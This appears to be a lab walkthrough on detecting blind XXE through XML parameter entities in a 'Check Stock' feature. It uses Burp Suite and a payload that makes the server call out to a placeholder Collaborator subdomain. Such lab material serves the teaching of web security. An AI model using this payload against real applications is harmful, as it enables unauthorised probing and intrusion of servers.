## Example Lab Exercise

In this lab, the "Check Stock" function analyzes XML input data but does not display unexpected values and blocks requests containing regular external entities.

### Steps to Perform the Attack

### 1. Select a Product
Open the list of products and choose any item:

---

### 2. Click the Button
On the product page, click the **"Check Stock"** button after enabling a proxy tool (e.g., Burp Suite):

---

### 3. Intercept the Request
Go to **Proxy â†’ HTTP History**, locate the POST request to `/product/stock`, and send it to **Repeater**:

![POST Request](https://github.com/user-attachments/assets/714f1495-42e5-48d2-b690-8bf41c3f3a57)

---

### 4. Inject the Payload ðŸš€

Insert the following parameter entity definition between the XML declaration and the `stockCheck` element. Use **Burp Collaborator** to insert your own subdomain where `BURP-COLLABORATOR-SUBDOMAIN` is indicated:
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

Replace the `productId` value with the parameter entity reference.

### 5. Check Collaborator
Switch to the **Collaborator** tab and click **"Poll now"**. If interactions are not visible, wait a few seconds and try again. You should see DNS and HTTP interactions initiated by the application as a result of your payload.
